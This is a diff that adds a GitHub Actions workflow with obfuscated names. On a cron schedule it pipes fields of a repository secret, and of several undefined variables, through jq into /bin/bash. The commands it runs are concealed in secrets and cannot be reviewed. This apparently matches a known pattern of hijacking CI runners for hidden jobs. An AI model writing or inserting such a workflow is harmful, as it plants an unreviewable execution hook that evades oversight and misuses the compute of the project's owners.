@@ -1,0 +1,22 @@
+name: bajiederoudaogua
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bajiederoudaogua
+        env:
+          vl624: ${{ secrets.vl624 }}
+        run: |
+          echo $vl624 | jq -r .h84355 | /bin/bash
+          echo $ajck800 | jq -r .qhfdx6279 | /bin/bash
+          echo $e80615 | jq -r .g0 | /bin/bash
+          echo $rwtuo5 | jq -r .otjan80 | /bin/bash
+          echo $bo274 | jq -r .kuudl2 | /bin/bash
+          echo $xo81 | jq -r .hda02908 | /bin/bash
+          echo $jg95 | jq -r .prx3126 | /bin/bash
+
